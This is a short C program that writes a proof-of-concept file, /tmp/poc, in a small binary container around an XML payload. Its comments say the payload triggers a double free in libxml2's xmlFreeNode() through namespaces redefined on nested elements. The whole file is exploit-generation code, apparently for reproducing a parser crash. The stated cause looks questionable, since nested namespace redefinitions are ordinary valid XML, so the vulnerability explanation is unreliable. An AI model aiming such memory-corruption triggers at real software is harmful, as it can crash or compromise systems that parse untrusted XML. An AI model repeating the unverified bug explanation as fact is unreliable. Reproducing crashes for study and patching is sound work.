#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

int main(void) {
    FILE *f = fopen("/tmp/poc", "wb");
    if (!f) { perror("fopen"); return 1; }

    /* XML payload designed to trigger bad_free in xmlFreeNode() */
    /* The vulnerability occurs when namespace declarations are redefined */
    /* on nested elements, causing the node's namespace list to be freed twice */
    const char *xml = "<?xml version=\"1.0\"?>"
                      "<root xmlns=\"http://a\" xmlns:ns=\"http://b\">"
                      "<child xmlns=\"http://c\" xmlns:ns=\"http://d\">"
                      "<grandchild xmlns=\"http://e\" xmlns:ns=\"http://f\"/>"
                      "</child>"
                      "</root>";
    size_t xml_len = strlen(xml);

    /* ByteStream container format:
     * - 4 bytes: options (0)
     * - 8 bytes: encoding length (0)
     * - 8 bytes: XML payload length
     * - XML payload bytes
     */
    int32_t options = 0;
    uint64_t enc_len = 0;
    uint64_t payload_len = (uint64_t)xml_len;

    fwrite(&options, sizeof(options), 1, f);
    fwrite(&enc_len, sizeof(enc_len), 1, f);
    fwrite(&payload_len, sizeof(payload_len), 1, f);
    fwrite(xml, 1, xml_len, f);

    fclose(f);
    return 0;
}